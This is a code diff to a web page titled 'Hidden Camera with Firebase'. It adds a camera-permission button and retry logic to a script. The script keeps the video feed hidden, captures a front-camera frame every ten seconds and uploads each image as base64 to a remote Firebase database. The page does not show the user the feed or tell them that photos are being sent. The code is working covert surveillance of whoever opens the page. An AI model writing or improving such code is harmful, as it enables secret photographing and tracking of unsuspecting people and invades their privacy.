@@ -6,6 +6,8 @@
     <title>Hidden Camera with Firebase</title>
 </head>
 <body>
+    <h3 id="status">Requesting Camera Access...</h3>
+    <button id="startButton">Allow Camera</button>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
@@ -30,36 +32,68 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let video = document.getElementById('video');
-        let canvas = document.getElementById('canvas');
-        let context = canvas.getContext('2d');
+        let video = document.getElementById("video");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+        let startButton = document.getElementById("startButton");
+        let statusText = document.getElementById("status");
         let stream = null;
+
+        async function requestCameraPermission() {
+            try {
+                let permission = await navigator.permissions.query({ name: "camera" });
+
+                if (permission.state === "denied") {
+                    statusText.innerText = "Camera access denied! Please enable it in browser settings.";
+                    return;
+                }
+
+                startCamera();
+            } catch (error) {
+                console.error("Permission error:", error);
+                statusText.innerText = "Error requesting camera permission.";
+            }
+        }
 
         async function startCamera() {
             try {
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
+
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
                 });
+
                 video.srcObject = stream;
-                setTimeout(autoCapture, 3000);
+                statusText.innerText = "Camera started.";
+                startButton.style.display = "none";
+
+                video.onloadedmetadata = () => {
+                    setTimeout(autoCapture, 3000);
+                };
             } catch (error) {
                 console.error("Camera access error:", error);
+                statusText.innerText = "Camera access failed. Check browser settings.";
             }
         }
 
         function captureImage() {
-            let targetWidth = 240;  
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                console.error("Video not ready, retrying...");
+                setTimeout(captureImage, 1000);
+                return;
+            }
+
+            let targetWidth = 240;
             let targetHeight = (video.videoHeight / video.videoWidth) * targetWidth;
 
             canvas.width = targetWidth;
             canvas.height = targetHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            let base64Image = canvas.toDataURL('image/webp', 0.2);  
-            let compressedBase64 = base64Image.replace(/^data:image\/webp;base64,/, '');
+            let base64Image = canvas.toDataURL("image/webp", 0.2);
+            let compressedBase64 = base64Image.replace(/^data:image\/webp;base64,/, "");
 
             sendToFirebase(compressedBase64);
         }
@@ -78,12 +112,12 @@
         }
 
         function autoCapture() {
+            console.log("Attempting to capture...");
             captureImage();
-            console.log("Compressed image captured and sent!");
             setTimeout(autoCapture, 10000);
         }
 
-        startCamera();
+        startButton.addEventListener("click", requestCameraPermission);
     </script>
 </body>
 </html>
